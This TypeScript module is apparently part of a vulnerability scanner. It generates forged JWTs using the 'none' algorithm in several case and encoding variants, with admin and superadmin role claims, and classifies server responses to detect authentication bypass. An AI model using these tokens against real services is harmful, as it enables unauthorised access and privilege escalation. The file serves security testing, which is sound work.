// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'jwt-none-algorithm',
  family: 'jwt-attack',
  title: 'JWT "none" algorithm bypass',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['header', 'cookie', 'query'],
  expectedSignals: ['auth-bypass', 'status-delta', 'privilege-change'],
  cwe: [327, 345],
};

function b64url(s: string): string {
  return Buffer.from(s).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function makeJwt(alg: string, payload: Record<string, unknown>): string {
  const header = b64url(JSON.stringify({ alg, typ: 'JWT' }));
  const body = b64url(JSON.stringify(payload));
  return `${header}.${body}.`;
}

const BASE_PAYLOAD = { sub: '1', role: 'admin', iat: 1700000000, exp: 9999999999 };

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return [
    {
      id: 'jwt-none-lowercase',
      family: 'jwt-attack',
      value: makeJwt('none', BASE_PAYLOAD),
      encoding: 'raw',
      intent: 'alg=none (lowercase) — signature stripped, expect auth bypass',
      destructiveRisk: 'none',
      expectedSignals: ['auth-bypass', 'status-delta'],
    },
    {
      id: 'jwt-none-uppercase',
      family: 'jwt-attack',
      value: makeJwt('NONE', BASE_PAYLOAD),
      encoding: 'raw',
      intent: 'alg=NONE (uppercase) — case-insensitive none check',
      destructiveRisk: 'none',
      expectedSignals: ['auth-bypass', 'status-delta'],
    },
    {
      id: 'jwt-none-mixed',
      family: 'jwt-attack',
      value: makeJwt('None', BASE_PAYLOAD),
      encoding: 'raw',
      intent: 'alg=None (mixed case) — case folding bypass',
      destructiveRisk: 'none',
      expectedSignals: ['auth-bypass', 'status-delta'],
    },
    {
      id: 'jwt-none-no-typ',
      family: 'jwt-attack',
      value: `${b64url(JSON.stringify({ alg: 'none' }))}.${b64url(JSON.stringify(BASE_PAYLOAD))}.`,
      encoding: 'raw',
      intent: 'alg=none, no typ field — minimal header variant',
      destructiveRisk: 'none',
      expectedSignals: ['auth-bypass'],
    },
    {
      id: 'jwt-none-empty-sig',
      family: 'jwt-attack',
      value: makeJwt('none', { ...BASE_PAYLOAD, role: 'superadmin' }),
      encoding: 'raw',
      intent: 'alg=none with elevated role claim — privilege escalation probe',
      destructiveRisk: 'none',
      expectedSignals: ['privilege-change', 'auth-bypass'],
    },
    {
      id: 'jwt-none-url-encoded',
      family: 'jwt-attack',
      value: encodeURIComponent(makeJwt('none', BASE_PAYLOAD)),
      encoding: 'url',
      intent: 'alg=none URL-encoded — for query-string JWT delivery',
      destructiveRisk: 'none',
      expectedSignals: ['auth-bypass', 'status-delta'],
    },
    {
      id: 'jwt-none-bearer-prefix',
      family: 'jwt-attack',
      value: `Bearer ${makeJwt('none', BASE_PAYLOAD)}`,
      encoding: 'header-safe',
      intent: 'alg=none with Bearer prefix for Authorization header insertion',
      destructiveRisk: 'none',
      expectedSignals: ['auth-bypass', 'status-delta'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const statusDelta = baseline.statusCode !== resp.statusCode;
  const wasUnauth = baseline.statusCode === 401 || baseline.statusCode === 403;
  const nowAuthed = resp.statusCode >= 200 && resp.statusCode < 300;

  if (wasUnauth && nowAuthed) {
    responseClass = 'expected-proof';
    confidence = 0.95;
    nextAction = 'promote-finding';
    evidence.push(`Baseline ${baseline.statusCode} → probe ${resp.statusCode}: authentication accepted with none-algorithm JWT`);
  } else if (statusDelta) {
    responseClass = 'status-delta';
    confidence = 0.55;
    nextAction = 'confirm';
    evidence.push(`Status changed from ${baseline.statusCode} to ${resp.statusCode} for variant ${variant.id}`);
  } else if (resp.bodyText.toLowerCase().includes('admin') && !baseline.bodyText.toLowerCase().includes('admin')) {
    responseClass = 'observed-value';
    confidence = 0.65;
    nextAction = 'confirm';
    evidence.push('Privileged content appeared in response body after none-algorithm JWT injection');
  } else {
    evidence.push('No observable change; server likely validates algorithm');
    nextAction = 'stop-negative';
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
